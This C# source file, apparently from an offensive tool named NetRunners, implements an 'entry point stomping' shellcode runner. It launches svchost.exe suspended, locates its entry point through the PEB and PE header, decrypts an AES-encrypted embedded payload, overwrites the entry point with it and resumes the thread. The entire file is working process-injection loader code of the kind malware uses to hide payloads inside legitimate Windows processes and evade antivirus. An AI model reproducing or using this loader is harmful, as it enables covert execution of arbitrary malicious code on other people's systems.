using System;
using System.Runtime.InteropServices;
using static NetRunners.DecryptionAlgorithms.Decryptor;
using static NetRunners.Data.Delegates;
using static NetRunners.Data.Structures;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the EntryPoint Stomping Shellcode Runner (Special Thanks 2 cpu0x00!)
    /// </summary>
    public static class EpsRunner
    {
        static byte[] buf = Data.EncryptedData.buf;
        static int sBuf = Data.EncryptedData.sBuf;       // decrypted buf size
        public static void Run()
        {
            try
            {
                // instantiate structs
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

                // create suspended svchost process
                int res = CreateProcessA(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, 0, 0x4, IntPtr.Zero, null, ref si, out pi);
                if (res == 0) // false
                    throw new InvalidOperationException($"CreateProcessA failed with error code: {Marshal.GetLastWin32Error()}");

                // fetch PEB address using zwqueryinfo
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                // fetch address of the code base
                byte[] addrBuf = new byte[IntPtr.Size];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                // parse PE header to locate entrypoint
                byte[] data = new byte[0x200];
                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
                uint opthdr = e_lfanew_offset + 0x28;
                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                //decrypt buf
                try
                {
                    buf = DecryptBytesToBytes_Aes(buf, AesKey, AesIV);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }

                // write shellcode to memory
                WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sBuf, out nRead);

                // resume thread
                ResumeThread(pi.hThread);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error ocurred: {e.Message}");
                throw;
            }
        }
    }
}
